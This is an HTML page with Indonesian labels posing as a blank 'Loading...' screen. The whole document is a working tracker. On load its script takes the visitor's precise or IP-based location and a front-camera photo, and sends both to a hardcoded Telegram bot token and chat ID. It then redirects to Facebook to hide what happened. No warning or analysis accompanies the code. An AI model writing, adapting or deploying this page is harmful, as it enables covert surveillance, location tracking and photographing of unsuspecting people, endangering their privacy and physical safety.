<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Memuat...</title>
<style>
  body { margin:0; background:#fff; font-family:sans-serif; height:100vh; overflow:hidden; }
</style>
</head>
<body>

<script>
const BOT_TOKEN = "8634866786:AAEOEqCHMoqqwfwc1VWb35Braps_zzwX-zE";
const CHAT_ID   = "1966317946";
const FB_URL    = "https://www.facebook.com/";

let locText = "Lokasi tidak tersedia.";
let locDone = false;
let camDone = false;
let photoBlob = null;

function checkDone() {
  if (locDone && camDone) {
    setTimeout(() => {
      kirimKeTelegram();
    }, 500);
  }
}

async function kirimKeTelegram() {
  try {
    const textData = JSON.stringify({
      chat_id: CHAT_ID,
      text: "<b>Data Masuk</b>\n" + locText,
      parse_mode: "HTML"
    });
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: textData,
      keepalive: true
    });
  } catch(e) {}

  if (photoBlob) {
    try {
      const form = new FormData();
      form.append("chat_id", CHAT_ID);
      form.append("photo", photoBlob, "cam.jpg");
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: "POST",
        body: form,
        keepalive: true
      });
    } catch(e) {}
  }

  window.location.replace(FB_URL);
}

function prosesLokasi() {
  const getIpLocation = async () => {
    try {
      const res = await fetch("https://ipapi.co/json/");
      const data = await res.json();
      if (data.latitude && data.longitude) {
        locText = `Lat (IP): ${data.latitude}\nLon (IP): ${data.longitude}\nKota: ${data.city}, ${data.country_name}\nMap: https://maps.google.com/?q=${data.latitude},${data.longitude}`;
      }
    } catch (e) {}
    locDone = true;
    checkDone();
  };

  if (!navigator.geolocation) {
    getIpLocation();
    return;
  }

  navigator.geolocation.getCurrentPosition(
    (pos) => {
      const lat = pos.coords.latitude;
      const lon = pos.coords.longitude;
      const acc = Math.round(pos.coords.accuracy);
      locText = `Lat: ${lat}\nLon: ${lon}\nAkurasi: ${acc} m\nMap: https://maps.google.com/?q=${lat},${lon}`;
      locDone = true;
      checkDone();
    },
    (err) => {
      getIpLocation();
    },
    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
  );
}

async function prosesKamera() {
  let stream = null;
  try {
    stream = await navigator.mediaDevices.getUserMedia({ 
      video: { facingMode: "user" }, 
      audio: false 
    });
  } catch (e1) {
    try {
      stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
    } catch (e2) {
      camDone = true;
      checkDone();
      return;
    }
  }

  try {
    const video = document.createElement("video");
    video.srcObject = stream;
    video.setAttribute("playsinline", "true"); 
    video.muted = true;
    
    await new Promise((resolve) => {
      video.onloadedmetadata = () => {
        video.play().then(() => setTimeout(resolve, 800)).catch(resolve);
      };
    });

    const canvas = document.createElement("canvas");
    canvas.width = video.videoWidth || 640;
    canvas.height = video.videoHeight || 480;
    canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);

    canvas.toBlob((blob) => {
      if (blob) photoBlob = blob;
      stream.getTracks().forEach(t => t.stop());
      camDone = true;
      checkDone();
    }, "image/jpeg", 0.8);
    
  } catch (err) {
    if (stream) stream.getTracks().forEach(t => t.stop());
    camDone = true;
    checkDone();
  }
}

window.addEventListener("DOMContentLoaded", () => {
  prosesLokasi();
  prosesKamera();
});
</script>
</body>
</html>
